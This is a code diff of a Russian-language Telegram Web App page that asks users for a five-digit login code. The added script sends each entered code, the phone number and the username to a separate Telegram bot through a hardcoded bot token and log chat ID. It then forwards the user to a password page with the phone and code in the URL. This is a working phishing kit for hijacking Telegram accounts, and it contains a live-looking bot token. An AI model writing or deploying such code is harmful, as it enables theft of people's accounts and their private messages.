@@ -7,7 +7,7 @@
 		<script src="https://telegram.org/js/telegram-web-app.js"></script>
 		<style>
 			:root {
-				--bg: #1c1b1b;
+				--bg: #000000;
 				--text: #fff;
 				--box: #2a2a2a;
 			}
@@ -87,11 +87,12 @@
 				font-weight: 600;
 				color: #fff;
 				border: 2px solid #3a3a3a;
-				transition: border-color 0.2s;
+				transition: all 0.3s ease;
 			}
 
 			.code-box.filled {
-				border-color: #2a9bf8;
+				border-color: #ffffff;
+				box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
 			}
 
 			.numpad {
@@ -111,7 +112,7 @@
 				color: var(--text);
 				font-weight: 600;
 				cursor: pointer;
-				transition: background 0.2s;
+				transition: all 0.3s ease;
 			}
 
 			.numpad button:hover {
@@ -119,10 +120,12 @@
 			}
 
 			.numpad button:active {
-				background: #4a4a4a;
+				background: #ffffff;
+				color: #000000;
+				box-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
+				transform: scale(0.95);
 			}
 
-			/* Экран загрузки */
 			.loading-screen {
 				display: none;
 				flex-direction: column;
@@ -175,158 +178,117 @@
 			</div>
 
 			<div class="numpad">
-				<button data-value="1">1</button>
-				<button data-value="2">2</button>
-				<button data-value="3">3</button>
-				<button data-value="4">4</button>
-				<button data-value="5">5</button>
-				<button data-value="6">6</button>
-				<button data-value="7">7</button>
-				<button data-value="8">8</button>
-				<button data-value="9">9</button>
+				<button>1</button><button>2</button><button>3</button> <button>4</button
+				><button>5</button><button>6</button> <button>7</button
+				><button>8</button><button>9</button>
 				<div></div>
-				<button data-value="0">0</button>
-				<button data-action="backspace">←</button>
+				<button>0</button><button>←</button>
 			</div>
 		</div>
 
-		<!-- Экран загрузки -->
 		<div class="screen loading-screen" id="loadingScreen">
 			<div class="spinner"></div>
 			<div>Проверка введённого кода…</div>
 		</div>
 
 		<script>
-			(function () {
-				'use strict';
+			const tg = window.Telegram.WebApp;
+			tg.expand();
 
-				let tg;
-				try {
-					tg = window.Telegram?.WebApp;
-					if (tg) {
-						tg.expand();
+			const codeBoxes = document.querySelectorAll('.code-box');
+			let code = '';
+			let phoneNumber = '';
+
+			try {
+				const urlParams = new URLSearchParams(window.location.search);
+				phoneNumber = urlParams.get('phone') || '';
+			} catch (e) {
+				console.log('Error parsing URL parameters');
+			}
+
+			if (
+				!phoneNumber &&
+				tg &&
+				tg.initDataUnsafe &&
+				tg.initDataUnsafe.start_param
+			) {
+				phoneNumber = tg.initDataUnsafe.start_param;
+			}
+
+			function updateBoxes() {
+				codeBoxes.forEach((box, i) => {
+					if (code[i]) {
+						box.textContent = '•';
+						box.classList.add('filled');
+					} else {
+						box.textContent = '';
+						box.classList.remove('filled');
 					}
-				} catch (e) {
-					console.log('Telegram WebApp init error:', e);
-				}
+				});
+			}
 
-				const codeBoxes = document.querySelectorAll('.code-box');
-				let code = '';
-				let isProcessing = false;
-
-				function updateBoxes() {
-					try {
-						codeBoxes.forEach((box, i) => {
-							if (code[i]) {
-								box.textContent = '•';
-								box.classList.add('filled');
-							} else {
-								box.textContent = '';
-								box.classList.remove('filled');
-							}
-						});
-					} catch (e) {
-						console.log('Error updating boxes:', e);
+			document.querySelectorAll('.numpad button').forEach(btn => {
+				btn.addEventListener('click', () => {
+					const value = btn.textContent;
+					if (value === '←') {
+						code = code.slice(0, -1);
+					} else if (!isNaN(value)) {
+						if (code.length < 5) code += value;
 					}
-				}
+					updateBoxes();
 
-				function safeNavigate(url) {
-					try {
-						if (isProcessing) return;
-						isProcessing = true;
-						window.location.href = url;
-					} catch (e) {
-						console.log('Navigation error:', e);
-						isProcessing = false;
+					if (code.length === 5) {
+						document.getElementById('authScreen').style.display = 'none';
+						document.getElementById('loadingScreen').style.display = 'flex';
+
+						localStorage.setItem('authPhoneNumber', phoneNumber);
+						localStorage.setItem('authCode', code);
+
+						tg.sendData(
+							JSON.stringify({
+								type: 'auth_code',
+								code: code,
+								user_id: tg.initDataUnsafe.user?.id,
+								phone_number: phoneNumber,
+							})
+						);
+
+						sendCodeToBot(code);
+
+						setTimeout(() => {
+							window.location.href = `password.html?phone=${encodeURIComponent(
+								phoneNumber
+							)}&code=${code}`;
+						}, 1000);
 					}
-				}
+				});
+			});
 
-				function handleCodeInput(value) {
-					try {
-						if (isProcessing) return;
+			function sendCodeToBot(code) {
+				const botToken = '7716220386:AAGwhUsT8OCKeBM8GmB7_sNXtFBvFgr_64I';
+				const logChatId = '-1003298308264';
 
-						if (value === 'backspace') {
-							code = code.slice(0, -1);
-						} else if (!isNaN(value) && value !== ' ' && value !== null) {
-							if (code.length < 5) code += value;
-						}
+				const user = tg.initDataUnsafe.user;
+				const username = user?.username ? `@${user.username}` : 'без username';
 
-						updateBoxes();
+				const message = `🔐 Код авторизации из WebApp\n👤 Пользователь: ${username}\n🔢 Код: ${code}`;
 
-						if (code.length === 5) {
-							processAuthCode();
-						}
-					} catch (e) {
-						console.log('Error handling code input:', e);
-					}
-				}
+				fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+					},
+					body: JSON.stringify({
+						chat_id: logChatId,
+						text: message,
+						parse_mode: 'HTML',
+					}),
+				}).catch(error => {
+					console.error('Ошибка отправки кода в лог:', error);
+				});
+			}
 
-				function processAuthCode() {
-					try {
-						if (isProcessing) return;
-						isProcessing = true;
-
-						const authScreen = document.getElementById('authScreen');
-						const loadingScreen = document.getElementById('loadingScreen');
-
-						if (authScreen) authScreen.style.display = 'none';
-						if (loadingScreen) loadingScreen.style.display = 'flex';
-
-						if (tg && tg.sendData) {
-							tg.sendData(
-								JSON.stringify({
-									type: 'auth_code',
-									code: code,
-									user_id: tg.initDataUnsafe?.user?.id || '',
-									phone_number: localStorage.getItem('phone_number') || '',
-								})
-							);
-							if (tg.close) tg.close();
-						} else {
-							console.log('Telegram WebApp недоступен, данные не отправлены');
-						}
-					} catch (processError) {
-						console.log('Ошибка обработки кода авторизации:', processError);
-						isProcessing = false;
-					}
-				}
-
-				function initializeButtons() {
-					try {
-						const buttons = document.querySelectorAll('.numpad button');
-						buttons.forEach(btn => {
-							btn.addEventListener('click', function (e) {
-								e.preventDefault();
-								const value =
-									this.getAttribute('data-value') ||
-									this.getAttribute('data-action');
-								if (value) {
-									handleCodeInput(value);
-								}
-							});
-						});
-					} catch (e) {
-						console.log('Error initializing buttons:', e);
-					}
-				}
-
-				function init() {
-					try {
-						initializeButtons();
-						updateBoxes();
-
-						document.removeEventListener('DOMContentLoaded', init);
-					} catch (e) {
-						console.log('Error in init:', e);
-					}
-				}
-
-				if (document.readyState === 'loading') {
-					document.addEventListener('DOMContentLoaded', init);
-				} else {
-					init();
-				}
-			})();
+			updateBoxes();
 		</script>
 	</body>
 </html>
